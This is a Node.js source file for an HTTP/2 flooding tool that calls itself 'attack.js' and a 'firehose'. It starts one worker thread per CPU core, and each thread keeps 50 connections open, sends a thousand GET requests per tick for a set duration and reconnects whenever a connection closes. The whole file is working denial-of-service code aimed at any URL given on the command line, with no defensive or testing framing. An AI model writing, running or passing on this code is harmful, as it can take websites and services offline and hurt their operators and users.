const http2 = require('http2');
const { Worker, isMainThread, workerData } = require('worker_threads');
const { cpus } = require('os');

const THREADS = cpus().length;
const CONNECTIONS_PER_THREAD = 50;
const STREAMS_PER_TICK = 1000;

if (isMainThread) {
    if (process.argv.length < 4) {
        console.log('Usage: node attack.js <https://target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);

    console.log(`Launching HTTP/2 firehose on ${target} for ${duration}s using ${THREADS} threads...`);

    for (let i = 0; i < THREADS; i++) {
        new Worker(__filename, { workerData: { target, duration } });
    }
} else {
    const { target, duration } = workerData;
    const end = Date.now() + duration * 1000;

    function createConnection() {
        const client = http2.connect(target, { settings: { enablePush: false } });

        client.on('connect', () => {
            function spam() {
                if (Date.now() > end || client.destroyed || client.closed) return;
                try {
                    for (let i = 0; i < STREAMS_PER_TICK; i++) {
                        const req = client.request({ ':method': 'GET', ':path': '/' });
                        req.on('error', () => {});
                        req.end();
                    }
                    setImmediate(spam);
                } catch (_) {
                    client.destroy();
                }
            }
            spam();
        });

        client.on('error', () => {});
        client.on('close', () => setTimeout(createConnection, 1));
    }

    for (let i = 0; i < CONNECTIONS_PER_THREAD; i++) {
        createConnection();
    }
}
